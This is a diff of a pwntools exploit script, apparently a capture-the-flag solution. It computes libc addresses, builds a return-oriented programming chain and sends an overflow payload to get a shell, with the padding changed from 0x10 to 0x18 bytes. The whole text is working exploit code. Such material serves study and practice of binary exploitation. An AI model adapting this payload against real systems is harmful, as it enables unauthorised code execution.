@@ -48,7 +48,6 @@ print(f'Base address: {hex(base_address)}')
 
 system_address = libc_elf.symbols.system
 print(f'system address: {hex(system_address)}')
-p.send(p64(target_elf.got.puts))
 
 chain = [
     ret_gadget.address + base_address,
@@ -59,6 +58,6 @@ chain = [
 
 
 p.recvline(b'shell!')
-p.sendline(b'A' * 0x10 + b"".join([p64(c) for c in chain]))
+p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
 
 p.interactive()
